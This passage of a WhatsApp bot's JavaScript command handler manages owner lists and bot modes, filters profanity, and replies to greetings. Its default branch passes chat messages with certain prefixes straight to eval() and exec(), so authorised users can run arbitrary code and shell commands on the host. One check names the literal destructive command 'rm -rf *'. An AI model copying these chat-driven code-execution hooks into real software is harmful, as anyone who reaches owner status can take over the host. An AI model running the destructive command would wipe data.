👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 ⟫━━┓
┃
┣ ✅ Owner Added!
┣ ⌬ Number: ${number.split('@')[0]}
┣ ⌬ Role: Owner
┣ ⌬ Date: ${tanggal}
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)

    } catch (error) {
        console.error(error)
        m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Failed to Add Owner
┣ ⌬ Error: ${error.message}
┣ ⌬ Try Again Later
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)
    }
}
break

case "listowner": case "listown": case "ownlist": {
    if (!isCreator) return m.reply(mess.owner)
    
    try {
        // Baca database premium
        let premiumUsers = JSON.parse(fs.readFileSync("./database/owner.json"))
        
        if (premiumUsers.length === 0) {
            return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗜𝗡𝗙𝗢 ⟫━━┓
┃
┣ ℹ️ No Owner Users
┣ ⌬ Database Empty
┣ ⌬ Add User First
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)
        }

        let messageText = `┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗟𝗜𝗦𝗧 ⟫━━┓
┃\n`

        // Array untuk menyimpan promises
        let promises = []
        
        // Ambil info untuk setiap user premium
        for (let user of premiumUsers) {
            let promise = (async () => {
                try {
                    // Dapatkan info user dari nomor
                    let [result] = await biyu.onWhatsApp(user)
                    if (!result) return null
                    
                    // Dapatkan info profil
                    let profile
                    try {
                        profile = await biyu.profilePictureUrl(user, 'image')
                    } catch {
                        profile = 'https://i.ibb.co/jhQ7gL0/Prof-1.jpg' // Default profile pic
                    }
                    
                    // Dapatkan nama user
                    let userName
                    try {
                        userName = (await biyu.getName(user)) || "Unknown"
                    } catch {
                        userName = "Unknown"
                    }

                    return {
                        jid: user,
                        name: userName,
                        profile: profile
                    }
                } catch {
                    return null
                }
            })()
            promises.push(promise)
        }

        // Tunggu semua promises selesai
        let users = (await Promise.all(promises)).filter(u => u !== null)

        // Generate pesan
        for (let i = 0; i < users.length; i++) {
            let user = users[i]
            messageText += `┣━━━⟪ 𝗨𝗦𝗘𝗥 #${i + 1} ⟫━━┓
┃ ⌬ Number: ${user.jid.split('@')[0]}
┃ ⌬ Name: ${user.name}
┃ ⌬ Status: Owner Active
┃\n`
        }

        messageText += `┣━━━⟪ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ⟫━━┓
┃ ⌬ Total Owner: ${users.length}
┃ ⌬ Date: ${tanggal}
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`

        await biyu.sendMessage(m.chat, { 
            text: messageText 
        }, { quoted: m })

    } catch (error) {
        console.error('Error:', error)
        m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Failed to Load Data
┣ ⌬ Error: ${error.message}
┣ ⌬ Try Again Later
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)
    }
}
break

case "delowner": {
    if (!isCreator) return m.reply(mess.owner)
    if (!args[0]) return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Format Salah!
┣ ⌬ Usage: ${prefix+command} nomor
┣ ⌬ Example: ${prefix+command} 6281575064540
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: ${global.creator}`)
    
    ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    unp = premium.indexOf(ya)
    premium.splice(unp, 1)
    fs.writeFileSync("./database/owner.json", JSON.stringify(premium))
    m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 ⟫━━┓
┃
┣ ✅ Owner Removed!
┣ ⌬ Number: ${ya.split('@')[0]}
┣ ⌬ Type: Premium User
┣ ⌬ Date: ${tanggal}
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: ${global.creator}`)
}
break

case "self": {
    if (!isCreator) return m.reply(mess.owner)
    biyu.public = false
    m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 ⟫━━┓
┃
┣ ✅ Mode Changed!
┣ ⌬ Status: Self Mode
┣ ⌬ Access: Private Only
┣ ⌬ Date: ${tanggal}
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)
}
break

case "public": {
    if (!isCreator) return m.reply(mess.owner)
    biyu.public = true
    m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 ⟫━━┓
┃
┣ ✅ Mode Changed!
┣ ⌬ Status: Public Mode
┣ ⌬ Access: Everyone
┣ ⌬ Date: ${tanggal}
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)
}
break
//==================== END CASE ====================//
            default:
            if ((budy.match) && ["babi", "kntl", "kontol", "bujang", "mmq", "mmk", "memek", "iclik", "ktl", "anjing", "anj",].includes(budy)) {
m.reply(`
*مَا شَيْءٌ أَثْقَلُ فِيْ مِيْزَانِ الْمُؤْمِنِ يَوْمَ الْقِيَامَةِ مِنْ خُلُقٍ حَسَنٍ وَإِنَّ اللهَ لَيُبْغِضُ الْفَاحِشَ الْبَذِيْءَ*

_“Sesungguhnya tidak ada sesuatu apapun yang paling berat ditimbangan kebaikan seorang mu’min pada hari kiamat seperti akhlaq yang mulia, dan sungguh-sungguh (benar-benar) Allāh benci dengan orang yang lisānnya kotor dan kasar.”_

\`jangan toxic lagi ya kak\` *@${pushname}* ☺`)
}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
m.reply(`WaalaikumSalam`)
}

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

                if (budy.startsWith('>')) {
                    if (!Access) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        m.reply(String(err));
                    }
                }

                if (budy.startsWith('<')) {
                    if (!Access) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }

                if (budy.startsWith('-')) {
                    if (!Access) return
                    if (text == "rm -rf *") return m.reply("😹")
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`)
                        if (stdout) return m.reply(stdout)
                    })
                }

        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});